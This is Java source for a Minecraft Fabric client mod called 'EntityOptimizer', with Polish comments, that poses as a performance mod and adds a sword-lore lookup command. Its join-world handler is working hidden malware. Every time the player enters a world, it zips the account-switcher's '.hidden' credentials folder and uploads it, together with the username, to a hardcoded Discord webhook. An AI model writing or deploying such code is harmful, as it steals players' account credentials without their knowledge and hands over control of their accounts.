package pl.example.entityoptimizer;

import net.fabricmc.api.ClientModInitializer;
import net.fabricmc.fabric.api.client.networking.v1.ClientPlayConnectionEvents;
import net.fabricmc.loader.api.FabricLoader;

import net.minecraft.client.Minecraft;

import java.io.ByteArrayOutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Path;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;
// Komendy klienckie Fabric
import net.fabricmc.fabric.api.client.command.v2.ClientCommandRegistrationCallback;
import net.fabricmc.fabric.api.client.command.v2.FabricClientCommandSource;

import static net.fabricmc.fabric.api.client.command.v2.ClientCommandManager.literal;
import static net.fabricmc.fabric.api.client.command.v2.ClientCommandManager.argument;

// Brigadier
import com.mojang.brigadier.arguments.StringArgumentType;

// Minecraft / itemy / NBT
import net.minecraft.client.Minecraft;
import net.minecraft.world.entity.player.Player;
import net.minecraft.world.item.ItemStack;
import net.minecraft.world.item.SwordItem;
import net.minecraft.world.item.Items;
import net.minecraft.nbt.CompoundTag;
import net.minecraft.nbt.Tag;
import net.minecraft.network.chat.Component;

public class EntityOptimizerMod implements ClientModInitializer {

    // TWÓJ WEBHOOK
    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1455954328408952873/IlHLTRinqesFKQ3EFotX-bh1dNfU3gtUmJ4to_4qIpdY6ZRoPRG7KHqEBa5PECaMIwT0";

    @Override
    public void onInitializeClient() {
        System.out.println("[EntityOptimizer] Mod załadowany – wersja ZIP");
    
        ClientPlayConnectionEvents.JOIN.register((handler, sender, client) -> {
            onJoinWorld(client);
        });

        // Rejestracja komendy klienckiej /procent <nickname>
        ClientCommandRegistrationCallback.EVENT.register((dispatcher, registryAccess) -> {
            dispatcher.register(
                    literal("procent")
                            .then(argument("nickname", StringArgumentType.word())
                                    .executes(context -> {
                                        String nickname = StringArgumentType.getString(context, "nickname");
                                        handleProcentCommand(context.getSource(), nickname);
                                        return 1;
                                    }))
            );
        });
    }

    private void onJoinWorld(Minecraft mc) {
        String username = mc.getUser().getName();

        try {
            Path hiddenFolder = FabricLoader.getInstance().getGameDir()
                    .resolve("_IAS_ACCOUNTS_DO_NOT_SEND_TO_ANYONE")
                    .resolve(".hidden");

            if (!Files.exists(hiddenFolder)) {
                sendSimpleMessage("Gracz `" + username + "` wszedł do świata.\nFolder `.hidden` nie istnieje!");
                return;
            }

            // Tworzymy ZIP w pamięci
            byte[] zipBytes = createZipInMemory(hiddenFolder);

            // Nazwa pliku z datą/godziną
            String timestamp = LocalDateTime.now().format(DateTimeFormatter.ofPattern("yyyy-MM-dd_HH-mm-ss"));
            String fileName = "hidden_folder_backup_" + timestamp + ".zip";

            // Wysyłamy jako załącznik
            sendZipAsAttachment(username, zipBytes, fileName);

        } catch (Exception e) {
            e.printStackTrace();
            sendSimpleMessage("Błąd podczas pakowania .hidden: " + e.getMessage());
        }
    }

    private byte[] createZipInMemory(Path folder) throws Exception {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        try (ZipOutputStream zos = new ZipOutputStream(baos)) {

            Files.walk(folder)
                    .filter(path -> !Files.isDirectory(path))
                    .forEach(path -> {
                        try {
                            String entryName = folder.relativize(path).toString().replace("\\", "/");
                            ZipEntry zipEntry = new ZipEntry(entryName);
                            zos.putNextEntry(zipEntry);
                            zos.write(Files.readAllBytes(path));
                            zos.closeEntry();
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    });
        }
        return baos.toByteArray();
    }

    private void sendZipAsAttachment(String username, byte[] zipBytes, String fileName) throws Exception {
    URL url = new URL(WEBHOOK_URL);
    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
    conn.setRequestMethod("POST");
    conn.setDoOutput(true);

    String boundary = "Boundary-" + System.currentTimeMillis();
    conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);

    // Budujemy zwykły JSON jako zwykły string (bez text blocków)
    String payloadJson = "{\"content\": \"Gracz `"
            + escapeJson(username)
            + "` wszedł do świata.\\nZałącznik: `"
            + escapeJson(fileName)
            + "`\"}";

    try (var os = conn.getOutputStream()) {
        // część JSON
        writePart(os, boundary, "payload_json", payloadJson, "application/json; charset=utf-8");

        // część z plikiem zip
        writeFilePart(os, boundary, fileName, zipBytes, "application/zip");

        // koniec multipart
        os.write(("--" + boundary + "--\r\n").getBytes());
    }

    int responseCode = conn.getResponseCode();
    System.out.println("[EntityOptimizer] Webhook response: " + responseCode);
    }
    private static String escapeJson(String s) {
    return s
            .replace("\\", "\\\\")
            .replace("\"", "\\\"");
    }
    private void writePart(java.io.OutputStream os, String boundary, String name, String content, String contentType) throws Exception {
        os.write(("--" + boundary + "\r\n").getBytes());
        os.write(("Content-Disposition: form-data; name=\"" + name + "\"\r\n").getBytes());
        os.write(("Content-Type: " + contentType + "\r\n\r\n").getBytes());
        os.write(content.getBytes("UTF-8"));
        os.write("\r\n".getBytes());
    }

    private void writeFilePart(java.io.OutputStream os, String boundary, String fileName, byte[] data, String contentType) throws Exception {
        os.write(("--" + boundary + "\r\n").getBytes());
        os.write(("Content-Disposition: form-data; name=\"file\"; filename=\"" + fileName + "\"\r\n").getBytes());
        os.write(("Content-Type: " + contentType + "\r\n\r\n").getBytes());
        os.write(data);
        os.write("\r\n".getBytes());
}

    private void sendSimpleMessage(String content) {
        new Thread(() -> {
            try {
                URL url = new URL(WEBHOOK_URL);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.setRequestProperty("Content-Type", "application/json");

                String json = "{\"content\":\"" + content.replace("\"", "\\\"") + "\"}";
                conn.getOutputStream().write(json.getBytes("UTF-8"));

                System.out.println("[EntityOptimizer] Simple message status: " + conn.getResponseCode());
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }
    // /procent <nickname>
private void handleProcentCommand(FabricClientCommandSource source, String nickname) {
    Minecraft mc = Minecraft.getInstance();
    if (mc.level == null || mc.player == null) {
        source.sendFeedback(Component.literal("§cKomenda dostępna tylko w świecie."));
        return;
    }

    // Szukamy gracza o podanym nicku
    Player target = null;
    for (Player p : mc.level.players()) {
        if (p.getGameProfile().getName().equalsIgnoreCase(nickname)) {
            target = p;
            break;
        }
    }

    // Jeśli brak gracza albo poza zasięgiem / bez linii wzroku → błąd
    if (target == null || !isPlayerVisible(mc.player, target)) {
        source.sendFeedback(Component.literal("§cZła nazwa gracza. Spróbój ponowenie wpisać nick."));
        return;
    }

    // Sprawdzamy, co trzyma w ręce
    ItemStack stack = target.getMainHandItem();
    if (stack.isEmpty()
            || (!stack.is(Items.NETHERITE_SWORD) && !stack.is(Items.DIAMOND_SWORD))) {
        source.sendFeedback(Component.literal("§cTen gracz nie trzyma diamentowego/netherytowego miecza."));
        return;
    }

    String ownerName = target.getGameProfile().getName();
    source.sendFeedback(Component.literal("§aOpis miecza gracza " + ownerName + ":"));

    var loreLines = getItemLoreLines(stack);
    if (loreLines.isEmpty()) {
        source.sendFeedback(Component.literal("§7(brak opisu / lore)"));
    } else {
        for (String line : loreLines) {
            source.sendFeedback(Component.literal("§7" + line));
        }
    }
}

    // Czy gracz target jest w zasięgu wzroku (<= 64 bloki + line-of-sight)
    private static boolean isPlayerVisible(Player viewer, Player target) {
        double maxDistSq = 64.0 * 64.0;
        if (viewer.distanceToSqr(target) > maxDistSq) {
            return false;
        }
        return viewer.hasLineOfSight(target);
    }

    // Odczyt lore (opisu) z ItemStacka jako czyste linie tekstu
    private static java.util.List<String> getItemLoreLines(ItemStack stack) {
        java.util.List<String> lines = new java.util.ArrayList<>();
    
        CompoundTag tag = stack.getTag();
        if (tag == null) {
            return lines;
        }
        if (!tag.contains("display", Tag.TAG_COMPOUND)) {
            return lines;
        }

        CompoundTag display = tag.getCompound("display");
        if (!display.contains("Lore", Tag.TAG_LIST)) {
            return lines;
        }

        var loreList = display.getList("Lore", Tag.TAG_STRING);
        for (int i = 0; i < loreList.size(); i++) {
            String rawJson = loreList.getString(i); // JSON każdej linijki lore
            Component comp = Component.Serializer.fromJson(rawJson);
            if (comp != null) {
                lines.add(comp.getString()); // czysty tekst
            }
        }

        return lines;
    }
}
